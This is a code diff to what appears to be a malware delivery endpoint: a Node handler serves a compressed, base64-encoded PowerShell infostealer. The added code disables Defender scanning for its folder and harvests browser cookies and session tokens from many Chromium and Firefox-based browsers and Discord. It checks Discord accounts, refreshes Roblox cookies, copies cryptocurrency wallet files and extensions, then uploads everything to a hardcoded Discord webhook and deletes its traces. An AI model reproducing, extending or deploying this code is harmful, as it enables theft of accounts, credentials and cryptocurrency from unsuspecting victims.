@@ -13,7 +13,6 @@ $ME = u 'dXNlcnMvQG1l'
 $AT = u 'YXV0aGVudGljYXRpb24tdGlja2V0'
 $wh='https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K'
 $UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
-Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 1100)
 $tmp=Join-Path $env:TEMP ('s'+[guid]::NewGuid().ToString('N').Substring(0,8))
 New-Item -ItemType Directory $tmp -Force|Out-Null
 try{Add-MpPreference -ExclusionPath $tmp -ErrorAction SilentlyContinue}catch{}
@@ -36,6 +35,8 @@ function Send($p,$n,$ct){
   }catch{Start-Sleep -Seconds (2*$a)}
  }
 }
+P ('start : '+$env:COMPUTERNAME+' | '+$PSVersionTable.PSVersion)
+Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 1100)
 $X=$false
 try{
 Add-Type -AssemblyName System.Security -ErrorAction Stop
@@ -193,4 +194,122 @@ function RB($c){
 try{
 A '=== SYSTEM ==='
 A ('user : {0}\{1}' -f $env:USERDOMAIN,$env:USERNAME)
-A ('host : {0}'
+A ('host : {0}' -f $env:COMPUTERNAME)
+A ('time : {0:u}' -f (Get-Date))
+try{A ('ip   : {0}' -f (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 10 -UseBasicParsing))}catch{}
+A ''
+$L=$env:LOCALAPPDATA;$AP=$env:APPDATA
+$B=@(
+ @{n='Chrome';p=$L+'\Google\Chrome\User Data'},
+ @{n='Chrome Beta';p=$L+'\Google\Chrome Beta\User Data'},
+ @{n='Chrome Dev';p=$L+'\Google\Chrome Dev\User Data'},
+ @{n='Chrome Canary';p=$L+'\Google\Chrome SxS\User Data'},
+ @{n='Edge';p=$L+'\Microsoft\Edge\User Data'},
+ @{n='Edge Beta';p=$L+'\Microsoft\Edge Beta\User Data'},
+ @{n='Edge Dev';p=$L+'\Microsoft\Edge Dev\User Data'},
+ @{n='Edge Canary';p=$L+'\Microsoft\Edge SxS\User Data'},
+ @{n='Brave';p=$L+'\BraveSoftware\Brave-Browser\User Data'},
+ @{n='Brave Beta';p=$L+'\BraveSoftware\Brave-Browser-Beta\User Data'},
+ @{n='Brave Nightly';p=$L+'\BraveSoftware\Brave-Browser-Nightly\User Data'},
+ @{n='Vivaldi';p=$L+'\Vivaldi\User Data'},
+ @{n='Yandex';p=$L+'\Yandex\YandexBrowser\User Data'},
+ @{n='Chromium';p=$L+'\Chromium\User Data'},
+ @{n='Thorium';p=$L+'\Thorium\User Data'},
+ @{n='Opera';p=$AP+'\Opera Software\Opera Stable'},
+ @{n='Opera GX';p=$AP+'\Opera Software\Opera GX Stable'},
+ @{n='Opera Beta';p=$AP+'\Opera Software\Opera beta'},
+ @{n='Opera Dev';p=$AP+'\Opera Software\Opera developer'}
+)
+$allCk=@();$allTk=@()
+foreach($b in $B){
+ if(-not(Test-Path $b.p)){continue}
+ $ku=$null;$ka=$null
+ if($X){$ku=KeyUser $b.p;$ka=KeyApp $b.p}
+ $profs=@($b.p)
+ Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{$profs+=$_.FullName}
+ foreach($pr in ($profs|Select-Object -Unique)){
+  foreach($rel in @($pr+'\Network\Cookies',$pr+'\Cookies')){
+   foreach($c in (GetCookies $rel $ku $ka)){$allCk+=[pscustomobject]@{B=$b.n;H=$c.H;V=$c.V}}
+  }
+  foreach($t in (GetTokens $ku $pr)){$allTk+=$t}
+ }
+}
+P ('stage : chromium '+$allCk.Count)
+$F=@($AP+'\Mozilla\Firefox\Profiles',$AP+'\zen\Profiles',$AP+'\librewolf\Profiles',$AP+'\Waterfox\Profiles',$AP+'\floorp\Profiles')
+foreach($fd in $F){
+ if(-not(Test-Path $fd)){continue}
+ Get-ChildItem $fd -Directory -ErrorAction SilentlyContinue|ForEach-Object{
+  foreach($c in (FFCookies ($_.FullName+'\cookies.sqlite'))){$allCk+=[pscustomobject]@{B='Firefox';H='.roblox.com';V=$c}}
+  foreach($t in (FFTokens ($_.FullName+'\storage\default'))){$allTk+=$t}
+ }
+}
+P ('stage : gecko '+$allCk.Count)
+foreach($d in @('discord','discordptb','discordcanary')){
+ $dd=$AP+'\'+$d
+ if(Test-Path $dd){$k=$null;if($X){$k=KeyUser $dd};foreach($t in (GetTokens $k $dd)){$allTk+=$t}}
+}
+$allTk=$allTk|Where-Object{$_}|Select-Object -Unique
+$ck=$allCk|Where-Object{$_.V}|Select-Object -Unique
+P ('stage : found '+$allTk.Count+' tk / '+$ck.Count+' ck')
+$tokOut=@();$ckOut=@()
+foreach($t in $allTk){
+ try{
+  $uu=Invoke-RestMethod ('https://discord.com/api/v9/'+$ME) -Headers @{Authorization=$t;'User-Agent'=$UA} -TimeoutSec 12 -UseBasicParsing
+  $line=('{0}#{1} | {2} | id {3} | 2fa {4}' -f $uu.username,$uu.discriminator,$uu.email,$uu.id,$uu.mfa_enabled)
+  A $line;A ('TOKEN: {0}' -f $t);A ''
+  $tokOut+=$line;('TOKEN: '+$t);''
+ }catch{}
+}
+if(-not $tokOut.Count){$tokOut+='none found'}
+$seen=@()
+foreach($c in ($ck|Where-Object{$_.H -like '*roblox*'})){
+ if($seen -contains $c.V){continue};$seen+=$c.V
+ $x=RB $c.V
+ if($x){
+  A ('USER : {0} (id {1}) | robux {2}' -f $x.u.name,$x.u.id,$x.r)
+  A ('COOKIE (IP-bypassed): {0}' -f $x.c)
+  A ('ORIGINAL [{0}]: {1}' -f $c.B,$c.V);A ''
+  $ckOut+=('USER : {0} (id {1}) | robux {2} [{3}]' -f $x.u.name,$x.u.id,$x.r,$c.B)
+  $ckOut+=('FRESH : '+$x.c);$ckOut+=('RAW   : '+$c.V);$ckOut+=''
+ }
+}
+if(-not $seen.Count){$ckOut+='no roblox cookie found'}
+A '=== ALL COOKIES ==='
+foreach($c in $ck){A ('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V);$ckOut+=('[{0}] {1} = {2}' -f $c.B,$c.H,$c.V)}
+$tkTxt=Join-Path $tmp 'tokens.txt';$ckTxt=Join-Path $tmp 'cookies.txt'
+$tokOut|Set-Content $tkTxt -Encoding UTF8
+$ckOut|Set-Content $ckTxt -Encoding UTF8
+$wdir=Join-Path $tmp 'w';New-Item -ItemType Directory $wdir -Force|Out-Null
+$wp=@($AP+'\Exodus\exodus.wallet',$AP+'\Electrum\wallets',$AP+'\atomic\Local Storage\leveldb',$AP+'\Coinbase',$AP+'\Trust Wallet',$AP+'\Phantom',$L+'\Phantom',$AP+'\Binance',$AP+'\Ledger Live',$AP+'\Wasabi Wallet',$AP+'\Bitcoin\wallets',$AP+'\Ethereum\keystore',$AP+'\Coin98',$AP+'\Solflare',$AP+'\Guarda')
+$exts=@{MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn';Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';Trust='egjidjbpglichdcondbcbdnbeeppgdph';Coinbase='hnlfjmpnagjnfpkljghhgnpmlpcoimja';Binance='fhbohimaelbohpjbbldcngcnapndodjp';Keplr='dmkamcknogkgcdfhhbddcghachkejeap';Solflare='bhhhlbepdkbapadjdnnojkbgioiodbic';TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec';Yoroi='ffnlbdhecaflocmhejdebcbfcbjjljhd';Nami='lpfcbjgnfdnmbafgjonjliakdjobofnk'}
+A '';A '=== WALLETS ==='
+foreach($p in $wp){if(Test-Path $p){Copy-Item $p (Join-Path $wdir ([IO.Path]::GetFileName($p))) -Recurse -Force;A ('dir  : {0}' -f $p)}}
+foreach($b in $B){
+ if(-not(Test-Path $b.p)){continue}
+ Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{
+  foreach($k in $exts.Keys){
+   $src=$_.FullName+'\'+$LS+'\..\'+$exts[$k]
+   if(Test-Path $src){Copy-Item $src (Join-Path $wdir ('ext_'+$k+'_'+$b.n)) -Recurse -Force;A ('ext  : {0} [{1}]' -f $k,$b.n)}
+  }
+ }
+}
+$rp=Join-Path $tmp 'report.txt';$R.ToString()|Set-Content $rp -Encoding UTF8
+$zp=Join-Path $tmp 'wallets.zip'
+try{Compress-Archive ($wdir+'\*') $zp -Force -ErrorAction Stop}catch{}
+P 'stage : send'
+Send $rp ('report-'+$env:COMPUTERNAME+'.txt') 'text/plain'
+Send $tkTxt ('tokens-'+$env:COMPUTERNAME+'.txt') 'text/plain'
+Send $ckTxt ('cookies-'+$env:COMPUTERNAME+'.txt') 'text/plain'
+Send $zp 'wallets.zip' 'application/zip'
+P 'done'
+}catch{P ('ERR: '+$_.Exception.Message+' (line '+$_.InvocationInfo.ScriptLineNumber+')')}
+Start-Sleep 2
+Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue`;
+
+module.exports = (req, res) => {
+  const b = zlib.deflateRawSync(Buffer.from(PAYLOAD, 'utf8'));
+  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+  res.setHeader('Cache-Control', 'no-store, max-age=0');
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.status(200).send(b.toString('base64'));
+};
